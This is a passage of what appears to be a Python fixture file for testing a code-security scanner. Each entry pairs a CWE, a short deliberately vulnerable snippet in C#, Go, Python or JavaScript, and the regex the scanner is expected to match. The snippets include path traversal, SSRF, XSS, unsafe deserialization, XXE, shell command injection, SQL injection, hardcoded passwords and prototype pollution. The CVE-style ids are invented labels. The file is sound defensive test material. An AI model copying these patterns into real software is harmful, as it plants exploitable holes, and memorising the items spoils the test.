        language="csharp",
        cwe="CWE-22",
        description="Path traversal via File.ReadAllText with unsanitized user input.",
        snippet="""\
using System.IO;
public class FileService {
    public string Read(string filename) {
        return File.ReadAllText(filename);
    }
}
""",
        expected_hit=r"CWE-22|path|File",
        sink_line=3,
    ),

    # C# SSRF — HttpClient (CWE-918)
    CVEEntry(
        cve_id="CVE-2024-CS-SSRF-HTTP",
        language="csharp",
        cwe="CWE-918",
        description="SSRF via HttpClient.GetStringAsync with unsanitized user URL.",
        snippet="""\
using System.Net.Http;
using Microsoft.AspNetCore.Mvc;
public class ProxyController : Controller {
  [HttpGet]
  public async Task<string> Fetch(string url) {
    var client = new HttpClient();
    return await client.GetStringAsync(url);
  }
}
""",
        expected_hit=r"CWE-918|SSRF|HttpClient",
        sink_line=6,
    ),

    # C# XSS — Response.Write (CWE-79)
    CVEEntry(
        cve_id="CVE-2024-CS-XSS-WRITE",
        language="csharp",
        cwe="CWE-79",
        description="XSS via HttpContext.Response.WriteAsync without encoding.",
        snippet="""\
using Microsoft.AspNetCore.Mvc;
public class XSSController : Controller {
  [HttpGet]
  public async Task XSS(string name) {
    await Response.WriteAsync("<h1>Hello " + name + "</h1>");
  }
}
""",
        expected_hit=r"CWE-79|XSS|WriteAsync",
        sink_line=5,
    ),

    # C# Insecure Deserialization — BinaryFormatter (CWE-502)
    CVEEntry(
        cve_id="CVE-2024-CS-DESER",
        language="csharp",
        cwe="CWE-502",
        description="Unsafe deserialization via BinaryFormatter.Deserialize.",
        snippet="""\
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
public class DeserializeService {
    public object Load(Stream stream) {
        var formatter = new BinaryFormatter();
        return formatter.Deserialize(stream);
    }
}
""",
        expected_hit=r"CWE-502|deserialization|BinaryFormatter",
        sink_line=5,
    ),

    # C# XXE — XmlDocument (CWE-611)
    CVEEntry(
        cve_id="CVE-2024-CS-XXE",
        language="csharp",
        cwe="CWE-611",
        description="XXE via XmlDocument without DTD processing disabled.",
        snippet="""\
using System.Xml;
public class XmlService {
    public void Parse(string xml) {
        var doc = new XmlDocument();
        doc.LoadXml(xml);
    }
}
""",
        expected_hit=r"CWE-611|XXE|XmlDocument",
        sink_line=4,
    ),

    # C# Hardcoded Connection String (CWE-798)
    CVEEntry(
        cve_id="CVE-2024-CS-HARDCODE",
        language="csharp",
        cwe="CWE-798",
        description="Hardcoded database connection string with password.",
        snippet="""\
public class DbConfig {
    private string connStr = "Server=localhost;Database=test;User=sa;Password=P@ssw0rd;";
}
""",
        expected_hit=r"CWE-798|hardcoded|Password",
        sink_line=2,
    ),

    # ------------------------------------------------------------------ #
    # ── Go CVEs ────────────────────────────────────────────────────────
    # ------------------------------------------------------------------ #

    # Go Command Injection — exec.Command (CWE-78)
    CVEEntry(
        cve_id="CVE-2024-GO-CMD-INJECT",
        language="go",
        cwe="CWE-78",
        description="OS command injection via exec.Command with user input.",
        snippet="""\
package main
import "os/exec"
func run(cmd string) {
    exec.Command("bash", "-c", cmd).Run()
}
""",
        expected_hit=r"CWE-78|command|exec",
        sink_line=4,
    ),

    # Go SQL Injection — database/sql with concatenation (CWE-89)
    CVEEntry(
        cve_id="CVE-2024-GO-SQLI",
        language="go",
        cwe="CWE-89",
        description="SQL injection via database/sql with string concatenation.",
        snippet="""\
package main
import "database/sql"
func lookup(username string) {
    db, _ := sql.Open("mysql", "user:pass@/db")
    db.Query("SELECT * FROM users WHERE name = '" + username + "'")
}
""",
        expected_hit=r"CWE-89|SQL|sql",
        sink_line=5,
    ),

    # Go SSRF — http.Get with user URL (CWE-918)
    CVEEntry(
        cve_id="CVE-2024-GO-SSRF",
        language="go",
        cwe="CWE-918",
        description="SSRF via http.Get with unsanitized user URL.",
        snippet="""\
package main
import "net/http"
func fetch(url string) {
    resp, _ := http.Get(url)
    defer resp.Body.Close()
}
""",
        expected_hit=r"CWE-918|SSRF|http.Get",
        sink_line=3,
    ),

    # Go Path Traversal — os.Open with user input (CWE-22)
    CVEEntry(
        cve_id="CVE-2024-GO-PATH",
        language="go",
        cwe="CWE-22",
        description="Path traversal via os.Open with unsanitized user input.",
        snippet="""\
package main
import "os"
func read(filename string) {
    f, _ := os.Open(filename)
    defer f.Close()
}
""",
        expected_hit=r"CWE-22|path|os.Open",
        sink_line=3,
    ),

    # ------------------------------------------------------------------ #
    # ── More Python CVEs ───────────────────────────────────────────────
    # ------------------------------------------------------------------ #

    # Python Open Redirect — Flask redirect (CWE-601)
    CVEEntry(
        cve_id="CVE-2024-PY-OPEN-REDIRECT",
        language="python",
        cwe="CWE-601",
        description="Open redirect via Flask.redirect with user-controlled URL.",
        snippet="""\
from flask import request, redirect
def login():
    next_url = request.args.get('next')
    return redirect(next_url)
""",
        expected_hit=r"CWE-601|redirect",
        sink_line=3,
    ),

    # Python LDAP Injection — ldap3 (CWE-90)
    CVEEntry(
        cve_id="CVE-2024-PY-LDAP",
        language="python",
        cwe="CWE-90",
        description="LDAP injection via unsanitized user input in search filter.",
        snippet="""\
import ldap3
from flask import request
def lookup():
    username = request.args.get("user")
    server = ldap3.Server("ldap://localhost")
    conn = ldap3.Connection(server)
    conn.search("dc=example,dc=com", f"(uid={username})")
""",
        expected_hit=r"CWE-90|LDAP",
        sink_line=6,
    ),

    # Python Log Injection (CWE-117)
    CVEEntry(
        cve_id="CVE-2024-PY-LOG-INJECT",
        language="python",
        cwe="CWE-117",
        description="Log injection via unsanitized user input in log message.",
        snippet="""\
import logging
from flask import request
def handle_login():
    user = request.args.get('user')
    logging.info(f'Login attempt from {user}')
""",
        expected_hit=r"CWE-117|log.injection",
        sink_line=5,
    ),

    # Python Mass Assignment (CWE-915)
    CVEEntry(
        cve_id="CVE-2024-PY-MASS-ASSIGN",
        language="python",
        cwe="CWE-915",
        description="Mass assignment via updating all request.form fields on a model.",
        snippet="""\
from flask import request, jsonify
def update_user():
    data = request.get_json()
    for key, val in data.items():
        setattr(current_user, key, val)
    return jsonify(ok=True)
""",
        expected_hit=r"CWE-915|mass.assignment|setattr",
        severity_min="high",
        sink_line=4,
    ),

    # Python Debug Mode (CWE-200)
    CVEEntry(
        cve_id="CVE-2024-PY-DEBUG-ON",
        language="python",
        cwe="CWE-200",
        description="Flask app with debug=True enabled in production.",
        snippet="""\
from flask import Flask
app = Flask(__name__)
app.run(debug=True)
""",
        expected_hit=r"CWE-200|debug",
        sink_line=3,
    ),

    # Python Hardcoded Secret (CWE-798)
    CVEEntry(
        cve_id="CVE-2024-PY-HARDCODE",
        language="python",
        cwe="CWE-798",
        description="Hardcoded AWS secret key in Python source.",
        snippet="""\
AWS_SECRET_KEY = "AKIAIOSFODNN7EXAMPLE"
def get_secret():
    return AWS_SECRET_KEY
""",
        expected_hit=r"CWE-798|hardcoded|secret",
        sink_line=1,
    ),

    # ------------------------------------------------------------------ #
    # ── More JavaScript CVEs ───────────────────────────────────────────
    # ------------------------------------------------------------------ #

    # JS Prototype Pollution (CWE-1321)
    CVEEntry(
        cve_id="CVE-2024-JS-PROTO-POLLUTE",
        language="javascript",
        cwe="CWE-1321",
        description="Prototype pollution via unsafe merge of user input.",
        snippet="""\
var user = {};
var data = JSON.parse(userInput);
user["__proto__"]["admin"] = true;
""",
        expected_hit=r"CWE-1321|prototype.pollution|__proto__",
        severity_min="high",
        sink_line=3,
    ),

    # JS Stored XSS — innerHTML (CWE-79)
    CVEEntry(
        cve_id="CVE-2024-JS-STORED-XSS",
        language="javascript",
        cwe="CWE-79",
        description="XSS via innerHTML with unsanitized user-controlled data.",
        snippet="""\
function displayComment(comment) {
    document.getElementById('comments').innerHTML += '<div>' + comment + '</div>';
}
""",
        expected_hit=r"CWE-79|XSS|innerHTML",
        sink_line=2,
    ),

    # JS CSRF — mutating route (CWE-352)
    CVEEntry(
        cve_id="CVE-2024-JS-CSRF",
        language="javascript",
        cwe="CWE-352",
        description="Express.js POST route without CSRF protection.",
        snippet="""\
const express = require('express');
const app = express();
app.post('/api/transfer', (req, res) => {
    transferFunds(req.body.amount, req.body.to);
    res.send('OK');
});
""",
        expected_hit=r"CWE-352|CSRF",
        sink_line=4,
    ),

    # JS Insecure Direct Object Reference (CWE-639)
    CVEEntry(
        cve_id="CVE-2024-JS-IDOR",
        language="javascript",
        cwe="CWE-639",
        description="IDOR via user-controllable ID parameter without ownership check.",
        snippet="""\
app.get('/api/order/:id', (req, res) => {
    const order = db.orders.findById(req.params.id);
    res.json(order);
});
""",
        expected_hit=r"CWE-639|IDOR|access.control",
        sink_line=2,
    ),

    # JS ReDoS — catastrophic regex (CWE-1333)
    CVEEntry(
        cve_id="CVE-2024-JS-REDOS",
        language="javascript",
        cwe="CWE-1333",
        description="ReDoS via user-controlled input matched against catastrophic regex.",
        snippet="""\
function validate(input) {
    const re = /^(a+)+b$/;
    return re.test(input);
}
""",
        expected_hit=r"CWE-1333|ReDoS|catastrophic",
        sink_line=2,
    ),
    # ------------------------------------------------------------------ #
]
